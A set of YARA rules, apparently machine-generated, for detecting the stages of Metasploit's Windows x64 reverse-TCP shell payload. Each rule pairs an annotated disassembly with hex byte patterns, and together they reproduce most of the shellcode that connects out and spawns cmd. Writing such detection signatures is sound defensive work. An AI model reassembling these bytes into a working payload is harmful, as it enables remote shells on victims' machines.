
    rule single_shell_reverse_tcp___start0___x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::__start0__"
    
        /*
            FC                   | .                    | cld
            4883E4F0             | H...                 | and rsp, 0xfffffffffffffff0
            E8C8000000           | .....                | call start
        */
    
        strings:
            $a   = { fc 48 83 e4 f0 e8 c8 00 00 00 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_api_call_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::api_call"
    
        /*
            4151                 | AQ                   | push r9
            4150                 | AP                   | push r8
            52                   | R                    | push rdx
            51                   | Q                    | push rcx
            56                   | V                    | push rsi
            4831D2               | H1.                  | xor rdx, rdx
            65488B5260           | eH.R`                | mov rdx, [gs:rdx+0x60]
            488B5218             | H.R.                 | mov rdx, [rdx+0x18]
            488B5220             | H.R                  | mov rdx, [rdx+0x20]
        */
    
        strings:
            $a   = { 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_next_mod_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::next_mod"
    
        /*
            488B7250             | H.rP                 | mov rsi, [rdx+0x50]
            480FB74A4A           | H..JJ                | movzx rcx, word [rdx+0x4a]
            4D31C9               | M1.                  | xor r9, r9
        */
    
        strings:
            $a   = { 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_loop_modname_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::loop_modname"
    
        /*
            4831C0               | H1.                  | xor rax, rax
            AC                   | .                    | lodsb
            3C61                 | <a                   | cmp al, 'a'
            7C02                 | |.                   | jl not_lowercase
            2C20                 | ,                    | sub al, 0x20
        */
    
        strings:
            $a   = { 48 31 c0 ac 3c 61 7c 02 2c 20 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_not_lowercase_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::not_lowercase"
    
        /*
            41C1C90D             | A...                 | ror r9d, 0xd
            4101C1               | A..                  | add r9d, eax
            E2ED                 | ..                   | loop loop_modname
            52                   | R                    | push rdx
            4151                 | AQ                   | push r9
            488B5220             | H.R                  | mov rdx, [rdx+0x20]
            8B423C               | .B<                  | mov eax, dword [rdx+0x3c]
            4801D0               | H..                  | add rax, rdx
            668178180B02         | f.x...               | cmp word [rax+0x18], 0x020b
            7572                 | ur                   | jne get_next_mod1
            8B8088000000         | ......               | mov eax, dword [rax+0x88]
            4885C0               | H..                  | test rax, rax
            7467                 | tg                   | jz get_next_mod1
            4801D0               | H..                  | add rax, rdx
            50                   | P                    | push rax
            8B4818               | .H.                  | mov ecx, dword [rax+0x18]
            448B4020             | D.@                  | mov r8d, dword [rax+0x20]
            4901D0               | I..                  | add r8, rdx
        */
    
        strings:
            $a   = { 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 66 81 78 18 0b 02 75 72 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_get_next_func_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::get_next_func"
    
        /*
            E356                 | .V                   | jrcxz get_next_mod
            48FFC9               | H..                  | dec rcx
            418B3488             | A.4.                 | mov esi, dword [r8+rcx*0x4]
            4801D6               | H..                  | add rsi, rdx
            4D31C9               | M1.                  | xor r9, r9
        */
    
        strings:
            $a   = { e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_loop_funcname_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::loop_funcname"
    
        /*
            4831C0               | H1.                  | xor rax, rax
            AC                   | .                    | lodsb
            41C1C90D             | A...                 | ror r9d, 0xd
            4101C1               | A..                  | add r9d, eax
            38E0                 | 8.                   | cmp al, ah
            75F1                 | u.                   | jne loop_funcname
            4C034C2408           | L.L$.                | add r9, [rsp+0x8]
            4539D1               | E9.                  | cmp r9d, r10d
            75D8                 | u.                   | jnz get_next_func
            58                   | X                    | pop rax
            448B4024             | D.@$                 | mov r8d, dword [rax+0x24]
            4901D0               | I..                  | add r8, rdx
            66418B0C48           | fA..H                | mov cx, [r8+0x2*rcx]
            448B401C             | D.@.                 | mov r8d, dword [rax+0x1c]
            4901D0               | I..                  | add r8, rdx
            418B0488             | A...                 | mov eax, dword [r8+0x4*rcx]
            4801D0               | H..                  | add rax, rdx
        */
    
        strings:
            $a   = { 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_finish_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::finish"
    
        /*
            4158                 | AX                   | pop r8
            4158                 | AX                   | pop r8
            5E                   | ^                    | pop rsi
            59                   | Y                    | pop rcx
            5A                   | Z                    | pop rdx
            4158                 | AX                   | pop r8
            4159                 | AY                   | pop r9
            415A                 | AZ                   | pop r10
            4883EC20             | H..                  | sub rsp, 0x20
            4152                 | AR                   | push r10
            FFE0                 | ..                   | jmp rax
        */
    
        strings:
            $a   = { 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_get_next_mod1_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::get_next_mod1"
    
        /*
            4159                 | AY                   | pop r9
            5A                   | Z                    | pop rdx
            488B12               | H..                  | mov rdx, [rdx]
            E94FFFFFFF           | .O...                | jmp next_mod
        */
    
        strings:
            $a   = { 41 59 5a 48 8b 12 e9 4f ff ff ff }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_reverse_tcp_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::reverse_tcp"
    
        /*
            49BE7773325F33320000 | I.ws2_32..           | mov r14, 'ws2_32'
            4156                 | AV                   | push r14
            4989E6               | I..                  | mov r14, rsp
            4881ECA0010000       | H......              | sub rsp, 408+8
            4989E5               | I..                  | mov r13, rsp
            49BC0200115C???????? | I....\....           | mov r12, 0x0100007f5c110002	; Host
            4154                 | AT                   | push r12
            4989E4               | I..                  | mov r12, rsp
            4C89F1               | L..                  | mov rcx, r14
            41BA4C772607         | A.Lw&.               | mov r10d, 0x0726774c
            FFD5                 | ..                   | call rbp
            4C89EA               | L..                  | mov rdx, r13
            6801010000           | h....                | push 0x0101
            59                   | Y                    | pop rcx
            41BA29806B00         | A.).k.               | mov r10d, 0x006b8029
            FFD5                 | ..                   | call rbp
            50                   | P                    | push rax
            50                   | P                    | push rax
            4D31C9               | M1.                  | xor r9, r9
            4D31C0               | M1.                  | xor r8, r8
            48FFC0               | H..                  | inc rax
            4889C2               | H..                  | mov rdx, rax
            48FFC0               | H..                  | inc rax
            4889C1               | H..                  | mov rcx, rax
            41BAEA0FDFE0         | A.....               | mov r10d, 0xe0df0fea
            FFD5                 | ..                   | call rbp
            4889C7               | H..                  | mov rdi, rax
            6A10                 | j.                   | push byte 16
            4158                 | AX                   | pop r8
            4C89E2               | L..                  | mov rdx, r12
            4889F9               | H..                  | mov rcx, rdi
            41BA99A57461         | A...ta               | mov r10d, 0x6174a599
            FFD5                 | ..                   | call rbp
            4881C440020000       | H..@...              | add rsp, ( (408+8) + (8*4) + (32*4) )
        */
    
        strings:
            $a   = { 49 be 77 73 32 5f 33 32 00 00 41 56 49 89 e6 48 81 ec a0 01 00 00 49 89 e5 49 BC 02 00 11 5C ?? ?? ?? ?? 41 54 49 89 e4 4c 89 f1 41 ba 4c 77 26 07 ff d5 4c 89 ea 68 01 01 00 00 59 41 ba 29 80 6b 00 ff d5 50 50 4d 31 c9 4d 31 c0 48 ff c0 48 89 c2 48 ff c0 48 89 c1 41 ba ea 0f df e0 ff d5 48 89 c7 6a 10 41 58 4c 89 e2 48 89 f9 41 ba 99 a5 74 61 ff d5 48 81 c4 40 02 00 00 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_shell_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::shell"
    
        /*
            41B8636D6400         | A.cmd.               | mov r8, 'cmd'
            4150                 | AP                   | push r8
            4150                 | AP                   | push r8
            4889E2               | H..                  | mov rdx, rsp
            57                   | W                    | push rdi
            57                   | W                    | push rdi
            57                   | W                    | push rdi
            4D31C0               | M1.                  | xor r8, r8
            6A0D                 | j.                   | push byte 13
            59                   | Y                    | pop rcx
        */
    
        strings:
            $a   = { 41 b8 63 6d 64 00 41 50 41 50 48 89 e2 57 57 57 4d 31 c0 6a 0d 59 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_push_loop_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::push_loop"
    
        /*
            4150                 | AP                   | push r8
            E2FC                 | ..                   | loop push_loop
            66C74424540101       | f.D$T..              | mov word [rsp+84], 0x0101
            488D442418           | H.D$.                | lea rax, [rsp+24]
            C60068               | ..h                  | mov byte [rax], 104
            4889E6               | H..                  | mov rsi, rsp
            56                   | V                    | push rsi
            50                   | P                    | push rax
            4150                 | AP                   | push r8
            4150                 | AP                   | push r8
            4150                 | AP                   | push r8
            49FFC0               | I..                  | inc r8
            4150                 | AP                   | push r8
            49FFC8               | I..                  | dec r8
            4D89C1               | M..                  | mov r9, r8
            4C89C1               | L..                  | mov rcx, r8
            41BA79CC3F86         | A.y.?.               | mov r10d, 0x863fcc79
            FFD5                 | ..                   | call rbp
            4831D2               | H1.                  | xor rdx, rdx
            48FFCA               | H..                  | dec rdx
            8B0E                 | ..                   | mov ecx, dword [rsi]
            41BA08871D60         | A....`               | mov r10d, 0x601d8708
            FFD5                 | ..                   | call rbp
        */
    
        strings:
            $a   = { 41 50 e2 fc 66 c7 44 24 54 01 01 48 8d 44 24 18 c6 00 68 48 89 e6 56 50 41 50 41 50 41 50 49 ff c0 41 50 49 ff c8 4d 89 c1 4c 89 c1 41 ba 79 cc 3f 86 ff d5 48 31 d2 48 ff ca 8b 0e 41 ba 08 87 1d 60 ff d5 }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_exitfunk_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::exitfunk"
    
        /*
            BBE01D2A0A           | ...*.                | mov ebx, 0x0a2a1de0
            41BAA695BD9D         | A.....               | mov r10d, 0x9dbd95a6
            FFD5                 | ..                   | call rbp
            4883C428             | H..(                 | add rsp, 40
            3C06                 | <.                   | cmp al, byte 6
            7C0A                 | |.                   | jl short goodbye
            80FBE0               | ...                  | cmp bl, 0xe0
            7505                 | u.                   | jne short goodbye
            BB4713726F           | .G.ro                | mov ebx, 0x6f721347
        */
    
        strings:
            $a   = { bb e0 1d 2a 0a 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f }
    
        condition:
            any of them
    }
    
    
    rule single_shell_reverse_tcp_goodbye_x64
    {
        meta:
            desc = "Metasploit::windows::x64::single_shell_reverse_tcp::goodbye"
    
        /*
            6A00                 | j.                   | push byte 0
            59                   | Y                    | pop rcx
            4189DA               | A..                  | mov r10d, ebx
            FFD5                 | ..                   | call rbp
        */
    
        strings:
            $a   = { 6a 00 59 41 89 da ff d5 }
    
        condition:
            any of them
    }
    
    